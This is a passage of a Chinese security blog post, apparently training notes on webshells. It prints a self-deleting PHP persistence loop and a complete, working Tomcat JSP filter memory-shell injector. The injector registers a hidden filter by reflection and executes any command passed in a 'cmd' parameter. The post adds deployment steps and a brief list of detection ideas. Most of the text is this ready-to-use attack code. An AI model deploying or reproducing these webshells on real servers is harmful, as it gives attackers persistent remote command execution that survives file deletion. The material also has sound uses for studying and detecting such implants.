+<p>将usleep改为小于php不死马的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;bsm22.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Java内存马"><a href="#Java内存马" class="headerlink" title="Java内存马"></a>Java内存马</h3><h4 id="filter型内存马原理"><a href="#filter型内存马原理" class="headerlink" title="filter型内存马原理"></a>filter型内存马原理</h4><p>    Filter：FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>
+<p><img src="VU2QhvQOTIIAyik7idTIyiHi99gDx9_a0MpRDEdo8c8.png" alt="image"></p>
+<p>web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter，当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法。在doFilter方法中，开发人员如果调用了FilterChain对象的doFilter方法，则web服务器会检查FilterChain对象中是否还有filter，如果有，则调用第2个filter，如果没有，则调用目标资源。</p>
+<p><strong>filter检测思路</strong>：</p>
+<ol>
+<li>带有特殊含义的filter的名字比如shell等。</li>
+<li>Filter的优先级，filter内存马需要将filter调至最高</li>
+<li>查看web.xml中有没有filter配置</li>
+<li>检测特殊的classloader</li>
+<li>检测classloader路径下没有class文件</li>
+<li>检测Filter中的doFilter方法是否有恶意代码</li>
+</ol>
+<p><strong>filter内存马实战</strong>：</p>
+<p>    这里我们将公开的filter类型的内存马文件直接上传到tomcat网站下，访问内存马后就植入成功了，植入成功后在删掉相对的jsp文件也不会影响内存马的运行，但是重启tomcat服务器后内存马即失效。注入成功后在路径后加入?cmd&#x3D;后跟命令即可。</p>
+<p>内存马代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">8</span>/<span class="number">9</span> --&gt;</span><br><span class="line">&lt;!-- &lt;%<span class="meta">@page</span> <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>%&gt;</span><br><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span> = <span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>%&gt; --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- tomcat <span class="number">7</span> --&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ <span class="type">page</span> <span class="variable">import</span> <span class="operator">=</span> <span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd!= <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">servletResponse.getOutputStream().flush();</span><br><span class="line">servletResponse.getOutputStream().close();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span>  request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;filterDemo&quot;</span>;</span><br><span class="line"><span class="comment">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//定义一些基础属性、类名、filter名等</span></span><br><span class="line"><span class="type">filterDemo</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">filterDemo</span>();</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加filterDef</span></span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*</span></span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line"><span class="comment">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加我们的filterMap到所有filter最前面</span></span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//将filter名和配置好的filterConifg传入</span></span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br><span class="line">out.write(<span class="string">&quot;Inject success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">out.write(<span class="string">&quot;Injected!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>tomcat启动</p>
+<p>C:\Users\hp\Desktop\apache-tomcat-9.0.62\bin</p>
+<p>web目录</p>
+<p>C:\Users\hp\Desktop\apache-tomcat-9.0.62\webapps\ROOT</p>
+<p><img src="S6fOVzVdKGBe7GvpYwfiKLxvpciGWUB9SNycBy_qvKk.png" alt="image"></p>
+<p><img src="mMzXCiKQ-Jx99dr6p06Y3APTB_nMNhqPeH4fZrmtKQo.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">day6-webshell详解一（上午：一句话、内存马）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">webshell详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E7%A7%8D%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">webshell种类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">常见一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">1.3.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp"><span class="toc-number">1.3.2.</span> <span class="toc-text">asp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#aspx"><span class="toc-number">1.3.3.</span> <span class="toc-text">aspx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp"><span class="toc-number">1.3.4.</span> <span class="toc-text">jsp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.</span> <span class="toc-text">WebShell管理工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WebShell%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">WebShell的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.</span> <span class="toc-text">内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.6.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98Webshell%E7%AE%80%E4%BB%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">内存Webshell简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98webshell%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.3.</span> <span class="toc-text">内存webshell原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.4.</span> <span class="toc-text">php内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.6.5.</span> <span class="toc-text">Java内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">filter型内存马原理</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&text=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&is_video=false&description=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=day6-webshell详解一（上午：一句话、内存马）&body=Check out this article: https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&title=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&name=day6-webshell详解一（上午：一句话、内存马）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%B8%80%EF%BC%88%E4%B8%8A%E5%8D%88%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%81%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%89/&t=day6-webshell详解一（上午：一句话、内存马）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2023
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
